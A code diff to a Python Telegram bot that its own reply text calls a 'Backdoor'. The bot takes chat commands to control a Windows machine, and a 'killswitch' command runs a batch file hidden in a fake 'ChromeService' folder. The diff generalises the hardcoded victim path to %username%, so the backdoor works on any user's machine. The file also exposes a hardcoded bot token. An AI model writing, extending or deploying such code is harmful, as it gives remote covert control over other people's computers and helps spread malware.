@@ -1,7 +1,6 @@
 from telegram.ext import Updater,CommandHandler,MessageHandler,Filters
 import os
 import pyautogui
-from time import sleep
 
 TOKEN = "5913616404:AAFW9HlRZqCEmh3EgBe8pOfVayRiz_zxvPM"
 
@@ -29,9 +28,8 @@ def answer(update,context):
     elif "killswitch" in testo:
         update.message.reply_text("Backdoor Deleted !")
 
-        os.system("move C:\\Users\\Beluga\\AppData\\Local\\Programs\\ChromeService\\updater.bat C:\\Users\\Beluga\\AppData\\Local\\Programs\\")
-        sleep(0.7)
-        os.system("C:\\Users\\Beluga\\AppData\\Local\\Programs\\updater.bat")
+        os.system("move C:\\Users\\%username%\\AppData\\Local\\Programs\\ChromeService\\updater.bat C:\\Users\\%username%\\AppData\\Local\\Programs\\")
+        os.system("C:\\Users\\%username%\\AppData\\Local\\Programs\\updater.bat")
         
     else:
         try:
